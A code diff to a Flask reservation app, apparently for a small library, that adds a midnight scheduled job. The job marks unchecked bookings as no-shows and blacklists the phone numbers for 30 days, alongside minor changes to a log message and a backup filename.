@@ -2190,7 +2582,6 @@ def delete_reservation_dev(id):
         return jsonify({'success': True})
     except Exception as e:
         db.session.rollback()
-        # The global error handler will catch this and log it to ErrorLog
         raise e
 
 @app.route('/dev/reservations/delete_bulk', methods=['POST'])
@@ -2237,7 +2628,7 @@ def download_logs_db():
     if not session.get('is_dev'): return redirect(url_for('login'))
     log_db_path = os.path.join(instance_path, 'logs.db')
     if os.path.exists(log_db_path):
-        return send_file(log_db_path, as_attachment=True, download_name=f'logs_backup_{datetime.now().strftime("%Y%m%d")}.sqlite')
+        return send_file(log_db_path, as_attachment=True, download_name=f'logs_backup_{datetime.now().strftime("%Y%m%d_%H%M%S")}.sqlite')
     else:
         return "Log DB does not exist yet.", 404
 
@@ -2268,7 +2659,7 @@ def restore_db():
         # Save uploaded file
         file.save(db_path)
         
-        log_admin_action('dev', f'Restored DB from uploaded file: {file.filename}')
+        log_admin_action('dev', f'DB 복원: {file.filename}')
         return jsonify({'success': True, 'backup': backup_name})
         
     except Exception as e:
@@ -2463,6 +2854,43 @@ def create_init_data():
         set_setting('wifi_info', 'ID: JihyeLib / PW: readbooks')
         set_setting('door_pw', '1234*')
 
+def auto_noshow_check():
+    """자정 지난 예약 중 체크인 안한 건 자동 노쇼 처리"""
+    now = datetime.now()
+    today_midnight = now.replace(hour=0, minute=0, second=0, microsecond=0)
+    
+    # 어제 자정 이전에 시작했지만 아직 'reserved' 상태인 예약 = 노쇼
+    noshow_candidates = Reservation.query.filter(
+        Reservation.start_time < today_midnight,
+        Reservation.status == 'reserved'
+    ).all()
+    
+    count = 0
+    for res in noshow_candidates:
+        res.status = 'noshow_penalty'
+        
+        # 블랙리스트에 추가 (30일)
+        existing = Blacklist.query.filter_by(phone=res.phone).first()
+        if existing:
+            existing.release_date = now + timedelta(days=30)
+            existing.reason = f"노쇼 자동처리 ({res.start_time.strftime('%Y-%m-%d')})"
+        else:
+            bl = Blacklist(
+                phone=res.phone,
+                name=res.name,
+                release_date=now + timedelta(days=30),
+                reason=f"노쇼 자동처리 ({res.start_time.strftime('%Y-%m-%d')})"
+            )
+            db.session.add(bl)
+        count += 1
+    
+    if count > 0:
+        db.session.commit()
+        print(f"Auto No-Show: {count} reservations marked as noshow_penalty")
+        log_admin_action('system', f'자동 노쇼 처리: {count}건')
+    
+    return count
+
 def perform_cleanup(days=365):
     cutoff_date = datetime.now() - timedelta(days=days)
     print(f"Cleanup Started. Cutoff: {cutoff_date}")
@@ -2643,6 +3071,14 @@ def scheduled_auto_mail(period):
 scheduler = BackgroundScheduler()
 # Run daily at 00:00
 scheduler.add_job(func=scheduled_cleanup, trigger="cron", hour=0, minute=0)
+# Auto No-Show check at 00:01 daily
+def scheduled_noshow_check():
+    with app.app_context():
+        try:
+            auto_noshow_check()
+        except Exception as e:
+            print(f"Scheduled No-Show Check Failed: {e}")
+scheduler.add_job(func=scheduled_noshow_check, trigger="cron", hour=0, minute=1, id='auto_noshow')
 # Weekly report: Every Monday at 09:00
 scheduler.add_job(func=lambda: scheduled_auto_mail('week'), trigger="cron", day_of_week='mon', hour=9, minute=0, id='auto_mail_weekly')
 # Monthly report: Every 1st of month at 09:00
